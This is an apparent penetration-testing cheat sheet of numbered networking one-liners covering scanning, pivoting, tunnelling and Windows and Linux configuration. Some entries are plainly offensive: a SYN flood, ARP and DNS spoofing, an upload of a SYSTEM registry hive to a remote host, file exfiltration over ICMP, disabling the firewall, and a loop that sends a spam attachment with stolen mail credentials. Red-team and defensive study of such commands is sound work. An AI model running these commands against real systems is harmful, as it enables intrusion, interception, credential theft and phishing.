### 1. add vlan to your interface
```
interface GigabitEthernet7; switchport trunk allowed vlan add 2
```
**- cisco,networking**
#### References:

http://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus5000/sw/configuration/guide/cli/CLIConfigurationGuide/AccessTrunk.html
__________
### 2. Forward the remote port to the local machine
```
ssh -R [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 3. Forward the local port to the remote machine
```
ssh -L [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 4. icmp ping
```
hping3 -1 [ip]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 5. syn scan port range with hping
```
hping3 -8 [port]-[port] -S [ip] -V
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 6. ACK scan on port
```
hping3 -A [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 7. udp port scan
```
hping3 -2 [ip] -p [port ]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
https://www.cyberciti.biz/tips/howto-linux-iptables-bypass-firewall-restriction.html
__________
### 8. Get initial sequence number
```
hping3 -Q [ip] -p [port] -s
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 9. get remote timestamp
```
hping3 -S [ip] -p [port] --tcp-timestamp
```
**- linux,bash,networking,enumeration**
#### References:

http://wiki.hping.org/
__________
### 10. Xmas' scan
```
hping3 -F -p -U [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 11. Sweep range for up hosts ie 192.168.1.x
```
hping3 -1 [ip].x --rand-dest -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 12. Intercept all http
```
hping3 -9 HTTP -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 13. Syn flood victim
```
hping3 -S [victim] -a [gw] -p [port] --flood
```
**- linux,bash,networking,interesting**
#### References:

http://wiki.hping.org/
__________
### 14. hp switch show if info
```
display interface brief
```
**- networking,hp**
#### References:

http://www.h3c.com.hk/technical_support___documents/technical_documents/wlan/access_point/h3c_wa2200_series_wlan_access_points/command/command/h3c_wa_wlan_access_cr-6w100/03/201009/691873_1285_0.htm
__________
### 15. Quick scan to set us off
```
nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 16. Quick scan of all the hosts (ignore pinging)
```
nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 17. Source port spoofing
```
nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 18. All port scan : assume up
```
nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 19. OS Detection
```
nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 20. Find sql servers
```
nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls
```
**- networking,scanning**
#### References:

https://wiki.archlinux.org/index.php/Nmap
__________
### 21. Change MAC address
```
ifconfig eth0 hw ether 00:E0:81:5C:B4:0F
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 22. How will the sytem route traffic to [IP]
```
ip route show to match [IP]
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 23. Depricated way of showing routing table, please see the ip command
```
route -n
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 24. Ettercap arp poisoning
```
ettercap -M arp -T -i em1 -L log /[TARGET]//
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
__________
### 25. Fierce (v0.9) - DNS bruteforcer
```
fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt
```
**- linux,networking,scanning,dns**
#### References:

https://github.com/mschwager/fierce
ha.ckers.org/fierce/
__________
### 26. WIFI : Enable monitor mode on interface
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;
```
**- linux,networking,wireless,wifi**
#### References:

https://www.aircrack-ng.org/doku.php?id=airodump-ng
__________
### 27. Yaps windows portscan, upload first duh
```
yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n
```
**- networking,scanning,Windows**
#### References:

http://www.steelbytes.com/?mid=19
__________
### 28. loop to look for dual homed hosts
```
for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host "ipconfig"; done | grep "IPv4 Address\|Ethernet adapter\|^[0-9]" | sed '/^$/d' | tee dualhomed-search.txt
```
**- networking,loop,enumeration,impacket**
#### References:

https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 29. show native port forwards windows
```
netsh interface portproxy show all
```
**- networking,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 30. set native port forward windows
```
netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip]
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 31. reset native port forward windows
```
netsh interface portproxy reset
```
**- networking,pivoting,Windows**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
__________
### 32. Windows list listening ports
```
netstat -a | find "LISTENING"
```
**- networking,enumeration,Windows**
#### References:

http://Microsoft.com
__________
### 33. Windows Wireless
```
netsh wlan show profile
```
**- networking,passwords,enumeration,Windows,wireless,wifi**
#### References:

http://Microsoft.com
__________
### 34. Windows Wireless
```
netsh wlan show profile name="[SSID]" key=clear
```
**- networking,passwords,Windows,wireless,wifi**
#### References:

https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 35. Windows ARP Cache
```
ipconfig /displaydns
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 36. ARP Spoofing filter
```
etterfilter *.filter -o smb.ef
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 37. ARP Spoofing gateway
```
ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 38. ARP Spoofing everything
```
ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 39. ARP Spoofing DNS
```
ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 40. Subnet calculator
```
ipcalc -b [CIDR Subnet]
```
**- networking,subnets**
#### References:

https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
__________
### 41. TCPDump (no DNS resolution)
```
tcpdump -n -i [interface]
```
**- networking,packet capture**
#### References:

http://rationallyparanoid.com/articles/tcpdump.html
https://www.cyberciti.biz/faq/tcpdump-capture-record-protocols-port/
__________
### 42. ARPing
```
arping -I em1 [TARGET IP]
```
**- linux,networking,scanning**
#### References:

https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
__________
### 43. ARPing sweep network
```
for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt
```
**- linux,networking,loop,scanning**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
__________
### 44. Temporary IP
```
ifconfig eth0 192.168.0.x/24
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 45. Wireless survey WIFI, useful if airmon start is broke
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0
```
**- linux,networking,wireless,wifi**
#### References:

http://www.aircrack-ng.org/doku.php?id=airmon-ng
__________
### 46. WIFI WPA handshake capture
```
airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon
```
**- linux,networking,wireless,wifi,packet capture**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 47. wep crack 3) Create a fake auth to the AP
```
aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0
```
**- linux,networking,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 48. Block outbound rule
```
iptables -I OUTPUT -d [DST IP] -j DROP
```
**- linux,networking**
#### References:

http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
__________
### 49. Accept inbound port rule
```
iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT
```
**- linux,networking**
#### References:

http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
__________
### 50. DNS zone transfer
```
dig -t AXFR [FQDN] @[SERVER IP]
```
**- linux,networking,dns**
#### References:

http://www.thegeekstuff.com/2012/02/dig-command-examples
__________
### 51. network discovery RDNS
```
for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v "name server"; done >> networks.txt
```
**- networking,loop,scanning,dns**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
__________
### 52. network discovery RDNS
```
cat networks-dirty.txt | grep "^[0-9]" | awk {'print $1'} | awk -F "." {'print $3"."$2"."$1".0/24"'} | sort -u > nets.txt
```
**- networking,loop,enumeration,dns**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
__________
### 53. network discovery RDNS
```
nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 54. network discovery RDNS
```
cat nmapScan-ARP.gnmap | grep "Status: Up" | awk {'print $2'} | awk -F "." {'print $1"."$2"."$3".0/24"'} | sort -u > networks-withlivehosts.txt
```
**- linux,networking,scanning**
#### References:

https://yg.ht
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 55. Telnet Mail
```
telnet [IP] 25
```
**- linux,networking,Windows**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 56. Telnet Mail
```
HELO [FQDN of your RDNS]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 57. Telnet Mail
```
MAIL FROM: [SENDER ADDRESS]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 58. Telnet Mail
```
RCPT TO: [RECIPIENT ADDRESS]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 59. Telnet Mail
```
DATA
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 60. Telnet Mail
```
Subject: [SUBJECT]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 61. Telnet Mail
```
Date: [DATE]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 62. Telnet Mail
```
From: [REAL NAME] <[EMAIL]>
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 63. Telnet Mail
```
To: [REAL NAME] <[EMAIL]>
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 64. Telnet Mail
```
[MESSAGE]
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 65. Telnet Mail
```
. (don't forget the full stop)
```
**- networking**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 66. load balance detection
```
halberd -v -p 10 [URL]
```
**- linux,networking,scanning,web application**
#### References:

https://github.com/jmbr/halberd
__________
### 67. Check for vlans that you can hop to : may need to change the grep for interfaces
```
frogger.sh
```
**- bash,networking,scanning**
#### References:

https://github.com/nccgroup/vlan-hopping---frogger
__________
### 68. manual vlans
```
vconfig add em1 [VLANID]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-vlan.html
__________
### 69. dhcp client
```
dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 70. dhcp lease rpm
```
cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 71. dhcp lease deb
```
cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 72. dhcp lease
```
ls -lt /var/lib/NetworkManager/
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 73. route table add
```
route add -net [CIDR] gw [IP] [INTERFACE]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 74. route table del
```
route del -net 0.0.0.0 gw [GW] eth1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 75. dns tunneling
```
iodine -P [pass] [server]
```
**- networking,pivoting**
#### References:

http://code.kryo.se/iodine/
http://calebmadrigal.com/dns-tunneling-with-iodine/
__________
### 76. nmap outbound tcp
```
nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 77. nmap outbound upd
```
nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 78. nmap smb signing
```
nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
```
**- linux,networking,scanning,smb,MitM**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 79. nmap devicemap all tcp
```
nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 80. nmap devicemap top 1000 udp
```
nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 81. nmap devicemap
```
grep "Discovered open port" nmap-udp-scan.txt | sed "s/\// /g" | sed "s/ /\t/g" | awk -F "\t" {'print $7"\t"$5"\t"$4"\topen"'} > devicemap-udp.tsv
```
**- linux,bash,text manipulation,networking**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 82. Take a screenshot of a HTTP service
```
nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n
```
**- linux,networking,scanning**
#### References:

https://necurity.co.uk/netsec/2015-04-20-Screenshots-with-Nmap/
https://github.com/SpiderLabs/Nmap-Tools/commit/36d74325f5ed5a057f954c1f9dd962631766ca10
__________
### 83. list network connections
```
netstat -tulpen
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/tips/tag/netstat-command
__________
### 84. print vpn keys
```
ip xfrm state list
```
**- linux,bash,networking,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
__________
### 85. enable ip forwarding in the kernel temporarily
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
**- linux,bash,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
__________
### 86. Iptables port forward
```
iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/tips/linux-iptables-examples.html
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables
__________
### 87. show hosts in the current domain or add a domain for searching
```
net view /domain
```
**- networking,enumeration,dns,Windows,recon**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490719.aspx
__________
### 88. show dnscache
```
ipconfig /displaydns
```
**- networking,enumeration,dns,Windows,forensics**
#### References:

https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 89. listening ports
```
netstat -anop | findstr LISTEN
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc940097.aspx
https://technet.microsoft.com/en-us/library/bb490947.aspx
__________
### 90. show interface information
```
netsh interface ip show
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 91. set static ip
```
netsh interface ip set address local static [ip] [mask] [gw] [ID]
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 92. set DNS server
```
netsh interface ip set dns local static [ip]
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 93. enable DHCP
```
netsh interface ip set address local dhcp
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
__________
### 94. disable local firewall
```
netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;
```
**- networking,Windows,configuration**
#### References:

https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx
__________
### 95. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 96. Ping ip with timeout of 500
```
$ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
```
**- networking,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 97. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 98. list subnets within the sites shown
```
dsquery subnet -site [site] -o rdn
```
**- networking,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-us/library/cc732207(v=ws.11).aspx
__________
### 99. see /etc/services
```
common ports
```
**- linux,networking,interesting**
#### References:

https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
__________
### 100. Networking Time to Live
```
TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris
```
**- networking,interesting**
#### References:

https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
__________
### 101. Networking Time to Live
```
Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router
```
**- networking,interesting,reference**
#### References:

https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
__________
### 102. Classfull networks have not existed since 1993 cisco GTFO with telling people they exist
```
Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE!
```
**- networking,interesting**
#### References:

https://en.wikipedia.org/wiki/Classful_network
__________
### 103. please use ipcalc, there is no l33tness in doing it in your head
```
Subnet ranges : /20 255.255.240.0 4096 hosts
```
**- networking,subnets,reference**
#### References:

https://www.aelius.com/njh/subnet_sheet.html
__________
### 104. Ip subnets
```
ipcalc -bnmp 10.0.0.1/20
```
**- linux,networking,subnets,reference**
#### References:

https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
__________
### 105. Route IPV6 through ipv4 for things that don't support it
```
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 106. replay packets to network
```
file2cable -i eth0 -f [file]
```
**- linux,networking,packet capture**
#### References:

http://manpages.ubuntu.com/manpages/xenial/man1/file2cable.1.html
__________
### 107. do a zone transfer request (just use host . . .)
```
dnsrecon -t axfr -d [domain]
```
**- linux,networking,enumeration,dns**
#### References:

https://github.com/darkoperator/dnsrecon
__________
### 108. look for a free short domain, good luck
```
for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done
```
**- linux,networking,loop,dns**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 109. Exfil over icmp
```
ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32
```
**- linux,networking,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 110. forward local traffic htting lport to [rip]:[rport]
```
fpipe.exe -l [lport] -r [rip] [ip]
```
**- networking,pivoting,Windows**
#### References:

https://www.mcafee.com/uk/downloads/free-tools/fpipe.aspx
http://exploit.co.il/hacking/pivoting-into-a-network-using-plink-and-fpipe/
__________
### 111. forward local traffic htting lport to [rip]:[rport]
```
socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 112. tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
```
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
```
**- linux,bash,networking,loop,interesting,scanning**
#### References:

http://tldp.org/LDP/abs/html/devref1.html
__________
### 113. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
```
ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 114. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK
```
plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip]
```
**- networking,pivoting,Windows**
#### References:

http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html
__________
### 115. set up a socks proxy, proxycahins may help also
```
ssh -D [port] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 116. Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email'
```
for i in `cat dets`; do echo "Sening Spam from $i"; mailx -s "Report Attached" -r "`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>" -a report.pdf -S smtp-auth=login -S smtp-auth-user="`echo $i | awk -F : '{print $1}'`" -S smtp-auth-password="` echo $i | awk -F : '{print $2}'`" -S ssl-verify=ignore -v -S smtp="10.11.1.229" [victim] < email;echo _________; done
```
**- networking,loop,interesting**
#### References:

http://www.binarytides.com/linux-mailx-command/
__________
### 117. Query the remote ntp time
```
sntp [ip]
```
**- linux,networking**
#### References:

http://doc.ntp.org/4.2.6/sntp.html
__________
### 118. Ask for a zone transfer
```
host -t axfr [ip]
```
**- linux,networking,enumeration**
#### References:

https://tools.ietf.org/html/rfc5936
__________
### 119. Internal Address ranges, 100 is for routing
```
10.0.0.0/8 (10.255.255.255) | 172.16.0.0/12 (172.31.255.255) | 192.168.0.0/16 | 100.64.0.0/10 (10.127.255.255)
```
**- networking,reference**
#### References:

https://tools.ietf.org/html/rfc1918
__________
### 120. Convert exfil ICMP back to files from pcap
```
for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v "......................................................" | sed s/.*11/11/g | grep "11.*99"  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done
```
**- linux,networking,loop**
#### References:

https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only
__________
